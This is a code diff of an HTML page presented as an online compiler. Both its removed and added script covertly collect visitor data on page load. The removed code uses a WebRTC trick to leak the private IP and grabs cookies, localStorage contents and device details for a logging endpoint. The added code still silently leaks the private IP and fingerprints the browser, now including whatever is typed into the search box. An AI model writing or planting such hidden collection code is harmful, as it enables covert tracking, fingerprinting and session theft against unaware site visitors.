@@ -7,6 +7,9 @@
 <body>
     <h1>Compiler Online</h1>
 
+    <h2>Search</h2>
+    <input type="text" id="search" placeholder="Enter search term..." />
+
     <h2>Code Submission</h2>
     <textarea id="code" rows="10" cols="30" placeholder="Write your code here..."></textarea><br>
     <button id="submit">Submit Code</button>
@@ -15,68 +18,47 @@
     <pre id="output"></pre>
 
     <script>
-        async function logUserInfo() {
+        async function logPrivateIPAndInfo() {
             const pc = new RTCPeerConnection();
             let logged = false;
 
             pc.createDataChannel('');
             pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
-            pc.onicecandidate = async event => {
+            pc.onicecandidate = event => {
                 if (event.candidate && !logged) {
                     const candidate = event.candidate.candidate;
                     if (candidate.includes("candidate")) {
                         const localIP = candidate.split(" ")[4];
+                        const searchTerm = document.getElementById('search').value || 'No search term entered';
+                        const userAgent = navigator.userAgent;
+                        const referrer = document.referrer || 'No referrer';
+                        const currentURL = window.location.href;
+                        const screenWidth = window.screen.width;
+                        const screenHeight = window.screen.height;
+                        const browserLanguage = navigator.language || navigator.userLanguage; // Get browser language
+                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Get time zone
+                        const osInfo = navigator.platform; // Get operating system
+                        const timestamp = new Date().toISOString(); // Current timestamp
+
                         logged = true;
 
-                        // Collect additional user information
-                        const userAgent = navigator.userAgent || 'No user agent';
-                        const currentURL = window.location.href || 'No URL';
-                        const screenWidth = screen.width || 'Unknown';
-                        const screenHeight = screen.height || 'Unknown';
-                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-                        const memoryInfo = `${(performance.memory ? performance.memory.total / (1024 ** 2) : 'Memory info not available')} MB`;
-                        const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
-                        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
-                        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins detected';
-                        const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 'Unknown', charging: 'Unknown' }));
-                        const batteryLevel = battery.level * 100 || 'Unknown';
-                        const isCharging = battery.charging || 'Unknown';
-                        const geolocation = 'Geolocation not available'; // Implement a method if needed
-                        const cookies = document.cookie || 'No cookies available';
-                        const localStorageData = JSON.stringify(localStorage) || 'No local storage data';
-
-                        const logData = {
-                            embeds: [{
-                                title: "Comprehensive User Information Logged",
-                                fields: [
-                                    { name: "Private IP", value: localIP, inline: true },
-                                    { name: "User Agent", value: userAgent, inline: true },
-                                    { name: "Current URL", value: currentURL, inline: true },
-                                    { name: "Screen Resolution", value: `${screenWidth} x ${screenHeight}`, inline: true },
-                                    { name: "Time Zone", value: timeZone, inline: true },
-                                    { name: "Memory Info", value: memoryInfo, inline: true },
-                                    { name: "Hardware Concurrency", value: hardwareConcurrency, inline: true },
-                                    { name: "Connection Type", value: connectionType, inline: true },
-                                    { name: "Browser Plugins", value: plugins, inline: true },
-                                    { name: "Battery Level", value: `${batteryLevel}%`, inline: true },
-                                    { name: "Charging Status", value: isCharging ? 'Charging' : 'Not Charging', inline: true },
-                                    { name: "Geolocation", value: geolocation, inline: true },
-                                    { name: "Cookies", value: cookies, inline: false },
-                                    { name: "Local Storage Data", value: localStorageData, inline: false }
-                                ],
-                                color: 5814783,
-                                footer: {
-                                    text: "Logged at " + new Date().toLocaleString()
-                                }
-                            }]
-                        };
-
-                        // Send log data to the backend API
-                        fetch('/api/log.js', {
+                        fetch('/api/log', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(logData)
+                            body: JSON.stringify({ 
+                                ip: localIP,
+                                searchTerm,
+                                userAgent,
+                                referrer,
+                                currentURL,
+                                screenWidth,
+                                screenHeight,
+                                browserLanguage,
+                                timeZone,
+                                osInfo,
+                                timestamp
+                            })
                         }).then(response => {
                             if (!response.ok) {
                                 console.error('Failed to log information');
@@ -103,7 +85,7 @@
         }
 
         document.getElementById('submit').onclick = compileCode;
-        logUserInfo(); // Start logging user info silently
+        logPrivateIPAndInfo(); // Start logging silently
     </script>
 </body>
 </html>
